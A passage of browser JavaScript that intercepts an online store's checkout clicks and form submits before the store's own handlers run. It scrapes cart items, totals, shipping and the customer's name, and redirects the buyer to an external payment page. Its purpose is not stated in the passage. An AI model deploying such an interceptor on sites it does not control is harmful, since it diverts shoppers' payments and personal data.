    function isCheckoutPage() {
        for (var i = 0; i < TEMPLATE_MARKERS.length; i++) {
            if (queryAll(document, TEMPLATE_MARKERS[i]).length) return true;
        }

        try {
            return /\/checkout(\/|$|\?)/i.test(window.location.pathname + window.location.search);
        } catch (error) {
            return false;
        }
    }

    /**
     * Decides which items are sent and which shipping value accompanies them.
     *
     * The itemized total must match the order total that was measured: when it
     * does not (discounts, an unreadable row) a single consolidated item is
     * sent instead, so the destination never charges a different amount.
     *
     * @param {{
     *   amount: number | null,
     *   title: string,
     *   image: string,
     *   items?: Array<{ name: string, price: number, quantity: number, description: string, image: string }>,
     *   shipping?: number | null,
     * }} data
     * @returns {{
     *   items: Array<{ name: string, price: number, quantity: number, description: string, image: string }>,
     *   shipping: number,
     * }}
     */
    function resolvePayload(data) {
        var total = typeof data.amount === 'number' && isFinite(data.amount) ? data.amount : 0;
        var shipping = typeof data.shipping === 'number' && isFinite(data.shipping) && data.shipping > 0
            ? data.shipping
            : 0;

        var items = data.items && data.items.length ? data.items : [];

        if (items.length) {
            var sum = shipping;

            for (var i = 0; i < items.length; i++) {
                sum += items[i].price * items[i].quantity;
            }

            sum = Math.round(sum * 100) / 100;

            if (Math.abs(sum - total) <= 0.05) {
                return { items: items, shipping: shipping };
            }
        }

        return {
            items: [{
                name: data.title || 'Pedido',
                price: total,
                quantity: 1,
                description: '',
                image: data.image || '',
            }],
            shipping: 0,
        };
    }

    /**
     * Builds the redirect URL with the scraped data.
     *
     * @param {{
     *   amount: number | null,
     *   title: string,
     *   image: string,
     *   items?: Array<{ name: string, price: number, quantity: number, description: string, image: string }>,
     *   shipping?: number | null,
     *   customer?: string,
     * }} data
     * @returns {string}
     */
    function buildRedirectUrl(data) {
        var base = CONFIG.redirectBaseUrl;
        var payload = resolvePayload(data);
        var items = payload.items.slice(0, Math.max(1, CONFIG.maxItems));

        var pairs = [
            ['loja', readStoreName()],
            ['origem', readOrigin()],
            ['servico', readHostname()],
            ['frete', formatAmount(payload.shipping)],
        ];

        for (var i = 0; i < items.length; i++) {
            var prefix = 'p' + (i + 1) + '_';
            var item = items[i];

            pairs.push([prefix + 'nome', item.name || '']);
            pairs.push([prefix + 'valor', formatAmount(item.price)]);
            pairs.push([prefix + 'qtd', String(item.quantity || 1)]);

            if (item.description) pairs.push([prefix + 'desc', item.description]);
            if (item.image) pairs.push([prefix + 'img', item.image]);
        }

        var customer = cleanText(data.customer || '');
        if (customer) pairs.push(['nome', customer]);

        var query = [];

        for (var j = 0; j < pairs.length; j++) {
            query.push(encodeParam(pairs[j][0]) + '=' + encodeParam(pairs[j][1]));
        }

        return base + (base.indexOf('?') >= 0 ? '&' : '?') + query.join('&');
    }

    /**
     * Tells whether the visitor is already on the redirect target (loop guard).
     *
     * @returns {boolean}
     */
    function isOnRedirectTarget() {
        try {
            var target = new URL(CONFIG.redirectBaseUrl, window.location.href);
            var here = new URL(window.location.href);

            return here.origin === target.origin
                && here.pathname.replace(/\/+$/, '') === target.pathname.replace(/\/+$/, '');
        } catch (error) {
            return false;
        }
    }

    /**
     * Navigates to the external payment page (top window when framed).
     *
     * @param {{
     *   amount: number | null,
     *   title: string,
     *   image: string,
     *   items: Array<{ name: string, price: number, quantity: number, description: string, image: string }>,
     *   shipping: number | null,
     *   customer: string,
     * }} data
     */
    function redirect(data) {
        if (redirecting) return;
        redirecting = true;

        var url = buildRedirectUrl(data);
        log('redirecting', url);

        var target = window;

        try {
            if (window.top && window.top !== window) target = window.top;
        } catch (error) {
            target = window;
        }

        try {
            target.location.assign(url);
        } catch (error) {
            window.location.href = url;
        }
    }

    /* --------------------------------------------------------------------- */
    /* Event handling                                                         */
    /* --------------------------------------------------------------------- */

    /**
     * Intercepts `click` / `submit` in the capture phase, so the store's own
     * handlers never run when the order must be diverted.
     *
     * @param {Event} event
     */
    function handleActionEvent(event) {
        if (redirecting) return;
        if (isOnRedirectTarget()) return;

        var action = event.type === 'submit'
            ? resolveSubmitAction(event.target, event.submitter || null)
            : resolveAction(event.target);

        if (!action) return;

        var amount = readAmount();
        if (amount === null) amount = cache.amount;

        if (!shouldRedirect(amount)) {
            log('allowed', { amount: amount, action: action });
            return;
        }

        event.preventDefault();
        event.stopPropagation();
        if (typeof event.stopImmediatePropagation === 'function') event.stopImmediatePropagation();

        var items = readItems();
        if (!items.length) items = cache.items;

        var shipping = readShipping();
        if (shipping === null) shipping = cache.shipping;

        var snapshot = {
            amount: amount,
            title: readTitle() || cache.title,
            image: readImage() || cache.image,
            items: items,
            shipping: shipping,
            customer: readCustomerName() || cache.customer,
        };

        log('blocked', snapshot);
        redirect(snapshot);
    }

    /* --------------------------------------------------------------------- */
    /* Bootstrap                                                              */
    /* --------------------------------------------------------------------- */

    /**
     * Keeps the cached snapshot fresh as the checkout re-renders.
     */
    function startObserver() {
        if (typeof window.MutationObserver !== 'function') return;

        var root = document.documentElement || document.body;
        if (!root) return;

        var scheduled = false;

        var observer = new window.MutationObserver(function () {
            if (scheduled) return;
            scheduled = true;

            window.setTimeout(function () {
                scheduled = false;
                refreshCache();
            }, 150);
        });

        observer.observe(root, {
            childList: true,
            subtree: true,
            characterData: true,
            attributes: true,
            attributeFilter: ['data-form-metric', 'data-total', 'data-total-value'],
        });

        api.observer = observer;
    }

    /**
     * Starts the interceptor.
     *
     * The observer only runs on pages that render the checkout template: this
     * file may be imported site-wide and there is nothing to watch on a home
     * page. Interception does not depend on that check — the capture-phase
     * listeners are always active — so an unrecognised template variant keeps
     * the previous (non-diverting) behaviour instead of breaking.
     */
    function init() {
        var onCheckout = isCheckoutPage();

        refreshCache();
        if (onCheckout) startObserver();

        log('active', { template: onCheckout, cache: cache });
    }

    // Capture phase: runs before any handler attached by the storefront.
    document.addEventListener('click', handleActionEvent, true);
    document.addEventListener('submit', handleActionEvent, true);

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})(typeof window !== 'undefined' ? window : null, typeof document !== 'undefined' ? document : null);
